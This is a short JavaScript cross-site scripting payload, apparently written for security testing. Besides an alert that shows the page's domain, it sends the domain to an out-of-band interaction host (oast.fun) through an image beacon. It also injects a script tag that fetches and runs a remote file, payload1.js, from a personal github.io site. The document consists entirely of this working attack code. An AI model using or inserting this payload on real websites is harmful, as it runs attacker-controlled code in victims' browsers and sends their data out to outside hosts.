// Example payload
alert("XSS ✅ on " + document.domain);

// Or for stealth testing
new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/log?" + document.domain;

var s = document.createElement('script');
s.src = "https://siddhu-1005.github.io/Siddhu/payload1.js";
document.body.appendChild(s);

